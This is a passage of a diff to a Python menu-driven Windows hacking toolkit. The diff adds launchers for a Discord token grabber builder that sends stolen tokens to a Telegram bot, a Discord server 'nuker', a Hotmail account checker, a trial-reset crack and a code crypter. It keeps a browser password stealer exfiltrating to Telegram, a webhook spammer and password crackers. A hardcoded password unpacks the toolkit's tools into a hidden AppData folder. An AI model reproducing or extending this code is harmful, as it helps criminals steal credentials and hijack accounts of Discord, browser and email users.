+                            print(f'\t{blue}[7]{rescolor} Clean Recent Files')
+                            print(f'\t{blue}[8]{rescolor} Empty Recycle Bin')
+                            print(f'\t{blue}[9]{rescolor} Run Disk Cleanup')
+                            print(f'\t{blue}[10]{rescolor} System Information')
+                            print(f'\t{blue}[0]{rescolor} Back to main menu')
+
+                            choice = input(f'\n{green}[+] {white}Choose option (0-10): {rescolor}').strip()
 
                             if choice == '0':
                                 break
                             elif choice == '1':
                                 os.system('cls')
-                                print_result(tw.flush_dns())
+                                print(f'{yellow}[!] {white}Starting comprehensive system cleanup...{rescolor}')
+                                print(f'{yellow}[!] {white}This may take several minutes. Please wait...{rescolor}')
+                                
+                                results = cleaner.comprehensive_clean()
+                                os.system('cls')
+                                print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
+                                print(f'{cyan}║                              CLEANUP SUMMARY                                 ║')
+                                print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
+                                
+                                total_items = 0
+                                total_size = 0
+                                for result in results:
+                                    print_result(result)
+                                    total_items += result.items_cleaned
+                                    total_size += result.space_freed
+                                
+                                print(f'\n{green}🎉 TOTAL CLEANUP RESULTS:{rescolor}')
+                                print(f'{white}• Items cleaned: {total_items:,}{rescolor}')
+                                print(f'{white}• Space freed: {cleaner._format_size(total_size)}{rescolor}')
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             elif choice == '2':
                                 os.system('cls')
-                                print_result(tw.reset_winsock())
-                                print(f"{yellow}[!] A reboot is recommended for changes to take effect{rescolor}")
+                                print_result(cleaner.clean_temp_files())
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             elif choice == '3':
                                 os.system('cls')
-                                print_result(tw.reset_ip_stack())
-                                print(f"{yellow}[!] A reboot is recommended for changes to take effect{rescolor}")
+                                print_result(cleaner.clean_browser_cache())
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             elif choice == '4':
                                 os.system('cls')
-                                primary = input(f'{green}[+] Primary DNS (e.g., 1.1.1.1):{white} ').strip()
-                                secondary = input(f'{green}[+] Secondary DNS (optional):{white} ').strip()
-                                secondary = secondary if secondary else None
-                                results = tw.set_dns_for_all_adapters(primary, secondary)
-                                os.system('cls')
-                                for r in results:
-                                    print_result(r)
+                                print_result(cleaner.clean_system_logs())
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             elif choice == '5':
                                 os.system('cls')
-                                results = tw.optimize_tcp()
-                                for r in results:
-                                    print_result(r)
-                                print(f"{yellow}[!] A reboot may improve effect of TCP changes{rescolor}")
+                                print_result(cleaner.clean_windows_update_cache())
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             elif choice == '6':
                                 os.system('cls')
-                                results = tw.apply_privacy_tweaks()
-                                for r in results:
-                                    print_result(r)
+                                print_result(cleaner.clean_prefetch_files())
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             elif choice == '7':
                                 os.system('cls')
-                                results = tw.revert_privacy_tweaks()
-                                for r in results:
-                                    print_result(r)
+                                print_result(cleaner.clean_recent_files())
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             elif choice == '8':
                                 os.system('cls')
-                                print_result(tw.clear_temp_files())
+                                print_result(cleaner.clean_recycle_bin())
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             elif choice == '9':
                                 os.system('cls')
-                                results = tw.debloat_edge()
-                                for r in results:
-                                    print_result(r)
-                                print(f"{yellow}[!] Some changes may require a reboot{rescolor}")
+                                print_result(cleaner.clean_disk_cleanup())
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+
                             elif choice == '10':
                                 os.system('cls')
-                                results = tw.disable_copilot()
-                                for r in results:
-                                    print_result(r)
-                                print(f"{yellow}[!] Sign out/in or reboot may be needed to reflect UI changes{rescolor}")
+                                info = cleaner.get_system_info()
+                                print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
+                                print(f'{cyan}║                            SYSTEM INFORMATION                                ║')
+                                print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
+                                
+                                for key, value in info.items():
+                                    if key != 'error':
+                                        print(f'{white}{key.replace("_", " ").title()}:{rescolor} {green}{value}{rescolor}')
+                                
+                                if 'error' in info:
+                                    print(f'{lcyan}Error: {info["error"]}{rescolor}')
+                                
                                 input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                             else:
-                                print(f'{red}[-] Invalid option. Choose 0-11.{rescolor}')
+                                print(f'{lcyan}[-] Invalid option. Choose 0-10.{rescolor}')
                                 time.sleep(1)
                                 os.system('cls')
                         except KeyboardInterrupt:
                             break
                         except Exception as e:
-                            print(f'\n{red}[-] System Tweaker error: {e}{rescolor}')
+                            print(f'\n{lcyan}[-] System Cleaner error: {e}{rescolor}')
                             input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
 
                 except Exception as e:
-                    print(f'\n{red}[-] Failed to open System Tweaker: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Failed to open System Cleaner: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+            
+            elif cmd == "9":
+                try:
+                    subprocess.check_output('cmd.exe /C start "IDM" tools/IDM_Trial_Reset.exe', shell=True)
+                    print(f'\n{green}[+] IDM Trial Reset launched successfully!{rescolor}')
+                except Exception as e:
+                    print(f'\n{lcyan}[-] Failed to launch IDM Trial Reset: {e}{rescolor}')
+                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+
             # Password Cracking & Security
             elif cmd == '10':
                 try:
@@ -4150,7 +4987,7 @@ def enhanced_main():
                         if hash_type < 1 or hash_type > 6:
                             raise ValueError("Invalid hash type")
                     except:
-                        print(f'\n{red}[-] Invalid hash type! Please choose 1-6.{rescolor}')
+                        print(f'\n{lcyan}[-] Invalid hash type! Please choose 1-6.{rescolor}')
                         time.sleep(3)
                         continue
                         
@@ -4162,7 +4999,7 @@ def enhanced_main():
                 except KeyboardInterrupt:
                     continue
                 except Exception as e:
-                    print(f'\n{red}[-] Hash cracking failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Hash cracking failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '11':
@@ -4175,7 +5012,7 @@ def enhanced_main():
                 except KeyboardInterrupt:
                     continue
                 except Exception as e:
-                    print(f'\n{red}[-] 7z cracking failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] 7z cracking failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '12':
@@ -4186,12 +5023,12 @@ def enhanced_main():
                     if zipfinput and pwdlistinput:
                         enhanced_zipfilecracker(zipfinput, pwdlistinput)
                     else:
-                        print(f'{red}[-] Invalid file paths provided.{rescolor}')
+                        print(f'{lcyan}[-] Invalid file paths provided.{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 except KeyboardInterrupt:
                     continue
                 except Exception as e:
-                    print(f'\n{red}[-] ZIP cracking failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] ZIP cracking failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '13':
@@ -4199,7 +5036,7 @@ def enhanced_main():
                     enhanced_wifiPassword()
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 except Exception as e:
-                    print(f'\n{red}[-] WiFi password retrieval failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] WiFi password retrieval failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '14':
@@ -4209,7 +5046,7 @@ def enhanced_main():
                 except KeyboardInterrupt:
                     continue
                 except Exception as e:
-                    print(f'\n{red}[-] Wordlist generation failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Wordlist generation failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '15':
@@ -4219,86 +5056,56 @@ def enhanced_main():
                     if pwds:
                         crack_wifi(pwds)
                     else:
-                        print(f'{red}[-] Invalid password dictionary path.{rescolor}')
+                        print(f'{lcyan}[-] Invalid password dictionary path.{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 except KeyboardInterrupt:
                     continue
                 except Exception as e:
-                    print(f'\n{red}[-] WiFi cracking failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] WiFi cracking failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             # Network & Web Tools
             elif cmd == '16':
+                from pytools.d_t import code_writer
+                os.system('cls')
+                print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
+                print(f'{cyan}║                            Dsiscord Token Grabber                            ║')
+                print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
+
+                tele_bot = input(f'\n{green}[+] Telegram Bot Token:{white} ')
+                channel_number = input(f'\n{green}[+] Channel Number:{white} ')
+                temp_path = code_writer(tele_bot, channel_number)
                 try:
-                    os.system('cls')
-                    while True:
-                        try:
-                            print(f'''{yellow}[!] {white}Discord Users Checker Instructions:{rescolor}
-
-{blue}[1]{white} Go to https://www.emailnator.com/
-{blue}[2]{white} Make sure the email ends with @gmail.com, click Go
-{blue}[3]{white} Go to https://discord.com/register and create the account
-{blue}[4]{white} Go to https://discord.com/login and login into Discord
-{blue}[5]{white} Login with account in this tool
-{blue}[6]{white} Keep your browser open and logged into Discord website{rescolor}
-''')
-                            webbrowser.open('https://discord.com/login')
-                            print(f'{cyan}[!] Login into Discord using browser first, then login here{rescolor}')
-
-                            emailInput = str(input(f'\n{green}[+] Email:{white} '))
-                            passwordInput = str(input(f'{green}[+] Password:{white} '))
-
-                            if not emailInput:
-                                print(f'\n{red}[-] Email cannot be empty{rescolor}')
-                                time.sleep(3)
-                                os.system('cls')
-                                continue
-                            elif not passwordInput:
-                                print(f'\n{red}[-] Password cannot be empty{rescolor}')
-                                time.sleep(3)
-                                os.system('cls')
-                                continue
-                            else:
-                                break
-                        except KeyboardInterrupt:
-                            break
-                            
-                    if emailInput and passwordInput:
-                        th = threading.Thread(target=discordHunter, args=(emailInput, passwordInput))
-                        th.start()
-                        th.join()
+                    shutil.move(temp_path, tool_parent_dir)
+                    print(f'\n{green}[+] Source Code Saved {lcyan}@ {white}{os.path.join(tool_parent_dir, 'd_t.py')}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                except Exception as e:
-                    print(f'\n{red}[-] Discord users checker failed: {e}{rescolor}')
+                except:
+                    print(f'\n{green}[+] Source Code Saved {lcyan}@ {white}{temp_path}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                    
+
             elif cmd == '17':
                 try:
                     enhanced_webhookSpammer()
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 except Exception as e:
-                    print(f'\n{red}[-] Webhook spamming failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Webhook spamming failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '18':
                 try:
-                    enhanced_url_masking()
-                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    discord_nuker()
                 except Exception as e:
-                    print(f'\n{red}[-] URL masking failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Discord Nuker failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '19':
                 try:
+                    from pytools.hotmail_checker import main
                     os.system('cls')
-                    ip = input(f'\n{green}[+] IP Address OR Domain Name:{white} ')
-                    if ip:
-                        enhanced_ip_lookup(ip)
+                    main(tool_parent_dir)
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                except KeyboardInterrupt:
-                    continue
                 except Exception as e:
-                    print(f'\n{red}[-] IP lookup failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Microsoft mail checker failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '20':
@@ -4307,20 +5114,15 @@ def enhanced_main():
                     enhanced_public_ip()
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 except Exception as e:
-                    print(f'\n{red}[-] Public IP lookup failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Public IP lookup failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '21':
                 try:
-                    os.system('cls')
-                    phone = input(f'\n{green}[+] Phone Number (with country code):{white} ')
-                    if phone:
-                        enhanced_phoneNumberTracker(phone)
+                    enhanced_url_masking()
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                except KeyboardInterrupt:
-                    continue
                 except Exception as e:
-                    print(f'\n{red}[-] Phone tracking failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] URL masking failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '22':
@@ -4328,7 +5130,7 @@ def enhanced_main():
                     nmapCommands()
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 except Exception as e:
-                    print(f'\n{red}[-] Nmap commands failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Nmap commands failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '23':
@@ -4336,7 +5138,7 @@ def enhanced_main():
                     proxy_gen()
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 except Exception as e:
-                    print(f'\n{red}[-] Proxy generation failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Proxy generation failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '24':
@@ -4346,7 +5148,7 @@ def enhanced_main():
                     proxy_check(prxlistinput)
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                 except Exception as e:
-                    print(f'\n{red}[-] Proxy checking failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Proxy checking failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             # Advanced & Special Tools
@@ -4354,7 +5156,7 @@ def enhanced_main():
                 try:
                     os.system('cls')
                     print(f'{yellow}[!] {white}Malware Tool - Chrome & Opera Password Stealer{rescolor}')
-                    print(f'{red}[!] {white}WARNING: This tool is for educational purposes only!{rescolor}\n')
+                    print(f'{lcyan}[!] {white}WARNING: This tool is for educational purposes only!{rescolor}\n')
                     
                     btoken = input(f'{green}[+] Telegram Bot Token:{white} ')
                     cid = input(f'{green}[+] Telegram Channel ID:{white} ')
@@ -4366,32 +5168,66 @@ def enhanced_main():
                 except KeyboardInterrupt:
                     continue
                 except Exception as e:
-                    print(f'\n{red}[-] Malware tool failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Malware tool failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                    
+
             elif cmd == '26':
+                from pytools.apkacrypter import APKAC
+                def print_banner():
+                    os.system('cls')
+                    print(rf'''{cyan}
+                                █████╗ ██████╗ ██╗  ██╗ █████╗        ██████╗██████╗ ██╗   ██╗██████╗ ████████╗
+                                ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗      ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝
+                                ███████║██████╔╝█████╔╝ ███████║█████╗██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   
+                                ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║╚════╝██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   
+                                ██║  ██║██║     ██║  ██╗██║  ██║      ╚██████╗██║  ██║   ██║   ██║        ██║   
+                                ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    
+                                                                                                                                                                                                    
+                        
+                                                ⍟ {green}Version     → {darkred}1
+                                                ⍟ {green}Github      → {darkred}https://github.com/apkaless
+                                                ⍟ {green}Instagram   → {darkred}https://instagram.com/apkaless
+                                                ⍟ {green}Region      → {darkred}IRAQ        
+
+                ''')
+                print_banner()
+                crypter = APKAC()
+                file = input(f'{cyan}\n↳ Py File To Encrypt {cyan}→{white}  ')
+                if file: 
+                    if crypter.crypt(file):
+                        crypted_file_path = os.path.abspath('encrypted_code.py')
+                        dest_path = tool_parent_dir
+                        shutil.move(crypted_file_path, dest_path)
+                        print(f'\n{green}[+] Encrypted And Saved To →  {white}{dest_path}\\encrypted_code.py')
+                        input('\n')
+                else:
+                    print(f'\n{red}[-] Please Enter A File')
+                    time.sleep(2)
+                    continue
+
+            elif cmd == '27':
                 try:
                     show_settings_menu()
                 except Exception as e:
-                    print(f'\n{red}[-] Settings menu failed: {e}{rescolor}')
-                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
-                    
-            elif cmd == '27':
-                try:
-                    system_monitor()
-                except Exception as e:
-                    print(f'\n{red}[-] System monitor failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] Settings menu failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             elif cmd == '28':
                 try:
+                    system_monitor()
+                except Exception as e:
+                    print(f'\n{lcyan}[-] System monitor failed: {e}{rescolor}')
+                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
+                    
+            elif cmd == '29':
+                try:
                     show_about_help()
                 except Exception as e:
-                    print(f'\n{red}[-] About & Help failed: {e}{rescolor}')
+                    print(f'\n{lcyan}[-] About & Help failed: {e}{rescolor}')
                     input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                     
             else:
-                print(f'\n{red}[-] Invalid choice! Please select a valid option.{rescolor}')
+                print(f'\n{lcyan}[-] Invalid choice! Please select a valid option.{rescolor}')
                 time.sleep(2)
 
     except KeyboardInterrupt:
@@ -4409,6 +5245,7 @@ if __name__ == '__main__':
         
         # Initialize color variables
         red = Fore.RED
+        darkred = Fore.LIGHTBLACK_EX
         white = Fore.WHITE
         blue = Fore.BLUE
         green = Fore.GREEN
@@ -4425,14 +5262,17 @@ if __name__ == '__main__':
         username = os.getlogin()
         
         # Setup paths
-        testfold = f'C:/Users/{username}/AppData/Roaming/'
-        path_to_roaming_windows = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows'
-        path_to_assistfolder = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/assistfolder'
+        global path_to_go, path_to_Apkaless
+        path_to_Apkaless = f'C:/Users/{username}/AppData/Local/Apkaless'
+        path_to_go = f'C:/Users/{username}/AppData/Local/Apkaless/go'
         zipfile_password = 'apkaless@iraq@2003@sabah@@2003'
 
-        os.chdir(path_to_roaming_windows)
-        if os.path.exists('assistfolder'):
-            os.chdir('assistfolder')
+        if not os.path.exists(path_to_Apkaless):
+            os.mkdir(path_to_Apkaless)
+        os.chdir(path_to_Apkaless)
+
+        if os.path.exists('go'):
+            os.chdir('go')
             if len(os.listdir()) <= 0:
                 os.chdir(tool_parent_dir)
                 print(f'{green}[+] Extracting tools...{white}')
@@ -4440,17 +5280,19 @@ if __name__ == '__main__':
                     f.extractall(pwd=zipfile_password.encode())
                 print(f'{green}[+] Tools extracted successfully{white}')
         else:
-            os.mkdir('assistfolder')
-            os.system('attrib /S /D +H assistfolder')
+            os.mkdir('go')
+            os.system('attrib /S /D +H go')
             
         os.chdir(tool_parent_dir)
         
-        if not os.path.exists(path_to_assistfolder) or len(os.listdir(path_to_assistfolder)) <= 0:
+        if not os.path.exists(path_to_go) or len(os.listdir(path_to_go)) <= 0:
             print(f'{green}[+] Extracting tools to assist folder...{white}')
             with pyzipper.AESZipFile('tools.zip', mode='r') as f:
-                f.extractall(path=path_to_assistfolder, pwd=zipfile_password.encode())
-
-        print(f'{cyan}[!] Checking for updates...{white}')
+                f.extractall(path=path_to_go, pwd=zipfile_password.encode())
+        config_manager = ConfigManager()
+        logger = Logger()
+        security_manager = SecurityManager()
+        network_manager = NetworkManager()
         enhanced_check_update()
         enhanced_main()
         
@@ -4458,7 +5300,7 @@ if __name__ == '__main__':
         print(f'\n{cyan}[!] Application startup interrupted by user')
         sys.exit(0)
     except Exception as e:
-        print(f'\n{red}[-] Critical error during startup: {e}')
+        print(f'\n{lcyan}[-] Critical error during startup: {e}')
         logger.error(f"Critical startup error: {e}")
         print(f'{yellow}[!] Please check the logs for more details')
         input(f'\n{blue}[!] {green}Press Enter to exit{rescolor}')
